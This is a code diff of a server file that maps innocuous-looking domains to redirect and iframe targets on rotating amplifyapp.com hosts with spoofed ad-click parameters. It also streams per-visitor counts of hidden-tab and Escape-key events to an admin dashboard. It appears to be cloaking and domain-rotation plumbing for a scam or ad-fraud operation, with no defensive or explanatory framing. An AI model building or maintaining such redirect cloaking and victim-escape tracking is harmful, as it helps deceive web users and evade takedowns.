@@ -85,9 +85,9 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairy.farm": { method: "redirect", target: "https://main.dwg3gtdevo0uj.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.dwg3gtdevo0uj.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://main.dwg3gtdevo0uj.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
+    "https://naotoshidairy.farm": { method: "redirect", target: "https://main.dlnrhr63licyk.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.dlnrhr63licyk.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://main.dlnrhr63licyk.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
@@ -95,7 +95,7 @@ const ORIGIN_GROUPS = {
     "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://ziyan-os3.vercel.app" },
   },
   aomine: {
-    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.dwg3gtdevo0uj.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
+    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.dlnrhr63licyk.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
   },
 };
 
@@ -874,6 +874,17 @@ app.post("/track/events", async (req, res) => {
     const escIncrements = events.filter(ev => ev.type === "key" && (ev.data || {}).key === "Escape").length;
     if (escIncrements > 0) {
       await redis.hincrby(keySession(sessionId), "escCount", escIncrements);
+    }
+
+    // Push live counter updates to the admin dashboard so hiddenCount and
+    // escCount badges update in real time without waiting for a heartbeat.
+    if (hiddenIncrements > 0 || escIncrements > 0) {
+      const updated = await redis.hmget(keySession(sessionId), "hiddenCount", "escCount");
+      broadcastSSE("update", {
+        id: sessionId,
+        hiddenCount: updated[0] || "0",
+        escCount:    updated[1] || "0",
+      });
     }
 
     broadcastSSE("events", { sessionId, events });
